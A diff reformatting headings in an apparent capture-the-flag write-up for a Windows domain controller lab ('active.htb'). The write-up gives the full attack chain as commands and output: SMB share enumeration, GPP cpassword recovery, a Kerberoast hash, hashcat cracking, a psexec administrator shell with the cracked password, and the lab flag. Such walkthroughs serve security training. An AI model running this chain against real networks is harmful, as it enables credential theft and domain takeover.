@@ -1,6 +1,6 @@
-#kerberoasting involved, query AD, get hash, and crack it. Using Bloodhound
+# Kerberoasting involved, query AD, get hash, and crack it.
 
-Using nmap:
+## Using nmap:
 for this windows box we want to use nmap for Enum.
 nmap -sCV [target IP]
 
@@ -17,12 +17,12 @@ PORT      STATE  SERVICE       VERSION
 25/tcp    closed smtp
 53/tcp    open   domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) 
 
-#this is our target /\
+## _this is our target /\_
 
 | dns-nsid: 
 |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
 
-#this is our target /\
+# this is our target /\
 
 88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-06 17:01:42Z)
 113/tcp   closed ident
@@ -46,7 +46,7 @@ PORT      STATE  SERVICE       VERSION
 49158/tcp open   msrpc         Microsoft Windows RPC
 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
 
-Host script results:
+_Host script results:_
 | smb2-time: 
 |   date: 2026-10-06T17:02:38
 |_  start_date: 2026-10-06T16:24:11
@@ -69,7 +69,7 @@ we type "> active.htb"
 and get the domain name back as "active.htb", shocker
 
 using command "locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
-### we are left with these nmap scripts:
+## we are left with these nmap scripts:
 
 /usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse:categories = {"vuln", "safe", "malware"}
 /usr/share/nmap/scripts/smb-enum-services.nse:categories = {"discovery","intrusive","safe"}
@@ -85,13 +85,13 @@ using command "locate -r '\.nse$' | xargs grep categories | grep 'default\|versi
 /usr/share/nmap/scripts/smb2-vuln-uptime.nse:categories = {"vuln", "safe"}
 
 
-### we now use this nmap command:
+## we now use this nmap command:
 nmap -Pn -p 445 -sV --script safe 10.10.10.100
 
 smb2-security-mode: 2:1:0:
 	Message signing enabled and required
 
-### now SMB stuff:
+## now SMB stuff:
 crackmapexec smb 10.129.76.174 --shares -u '' -p '' -M gpp_password
 
 
@@ -108,7 +108,7 @@ SMB         10.129.76.174   445    DC               NETLOGON                    
 SMB         10.129.76.174   445    DC               Replication     READ            
 SMB         10.129.76.174   445    DC               SYSVOL                          Logon server share 
 
-### [IMPORTANT] Use NetExec to Find and Download the Groups.xml File:
+## [IMPORTANT] Use NetExec to Find and Download the Groups.xml File:
 Run this command to search the Replication share for files containing the word "Groups":
 
 nxc smb 10.129.76.174 -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
@@ -144,7 +144,7 @@ SPIDER_PLUS 10.129.76.174   445    DC               [*] File unique exts:     4 
 SPIDER_PLUS 10.129.76.174   445    DC               [*] Downloads successful: 7
 SPIDER_PLUS 10.129.76.174   445    DC               [+] All files processed successfully.
 
-### Now find the downloaded cpassword file, we can see the file path from SPIDER PLUS:
+## Now find the downloaded cpassword file, we can see the file path from SPIDER PLUS:
 
 grep -i "cpassword" -r /root/.nxc/modules/nxc_spider_plus/
 
@@ -194,14 +194,14 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$789bd11aa5b6414c
 UNZIP rockyou.txt:
 locate rockyou.txt
 
-### NOW WE HASHCAT USING MODE 13100:
+## NOW WE HASHCAT USING MODE 13100:
 hashcat -m 13100 hashes.kerberoast /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
 
 
 
 to get:
-### username: Administrator
-### password: Ticketmaster1968
+## username: Administrator
+## password: Ticketmaster1968
 
 now lets try logging in with our credentials:
 ok we are now logged in with an administrator account:
@@ -214,7 +214,7 @@ Run Impacket's psexec.py utility from your terminal to establish a stable nt aut
 impacket-psexec active.htb/Administrator:Ticketmaster1968@10.129.76.174
 
 
-### and finally... lets find our flags:
+## and finally... lets find our flags:
 
 C:\Users\SVC_TGS\Desktop\user.txt
 842ce83606ee22a3eb710e98f32bf671
